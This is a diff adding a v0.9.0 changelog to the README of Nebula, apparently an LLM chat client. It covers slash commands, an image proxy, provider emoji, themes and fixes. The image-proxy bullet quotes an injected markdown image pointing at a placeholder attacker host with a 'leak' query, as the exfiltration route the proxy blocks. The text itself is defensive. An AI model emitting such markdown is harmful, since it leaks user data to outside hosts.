@@ -8,6 +8,17 @@ This code is mostly written by LLMs. See the HLD (`docs/nebula_hld_0.6.md`) for 
 
 **Current version:** `v0.9.0`
 
+### What's new in v0.9.0
+
+- **Slash commands with an interactive palette**: type `/` in the composer to open an autocomplete suggestions palette. Commands cover Meta (`/help`, `/new`, `/clear`, `/model`), Memory (`/remember`, `/recall`, `/facts`), Search (`/search`), and Skills (`/skills`, `/skill`) — e.g. `/model <name>` switches models by name or id substring, `/new [title]` spins up a fresh conversation, and `/recall <query>` runs a hybrid semantic + BM25 search over your memory docs.
+- **Secure inline image proxy**: remote (`http(s)`) markdown images now render through an allowlisted backend proxy instead of the webview fetching them directly, so the CSP stays locked to `img-src 'self' data:` and an injected `![](https://attacker/?leak=…)` can't fire a request or exfiltrate data. The proxy re-validates every redirect hop (SSRF guard), requires an `image/*` content-type, and caps downloads at 10 MB. Manage the host allowlist in **Settings → Image Display Allowlist**.
+- **Custom provider emoji & names in the model selector**: give each provider a custom emoji (click-to-edit on the provider card, multi-codepoint emoji supported); the model dropdown now shows the provider name and emoji as a dimmed sublabel so you can tell same-named models apart across providers.
+- **Ink themes**: three new palettes ported from Loom — **Ink**, **Ink Light**, and **Ink Medium** — available in the theme picker.
+- **Version build metadata**: the Settings panel now shows the git commit hash and build date next to the Nebula version, baked in at build time.
+- **Built-in usage docs**: Nebula now ships built-in memory and usage docs in the binary so it can explain its own memory model and features out of the box.
+- **Fix — regenerate**: regenerating a response no longer duplicates the user message.
+- **Fix — OpenAI-compatible providers**: requests no longer send both `temperature` and `top_p`, which some endpoints reject.
+
 ### What's new in v0.8.1
 
 - **Unified right rail**: the **Tools**, **Memory**, and **Tasks** views are consolidated into a single collapsible right-hand rail. Tools and Memory are tabs; the Tasks slab auto-appears when the current conversation has a checklist. Collapse to a thin strip, and your collapsed / active-tab state persists across sessions.
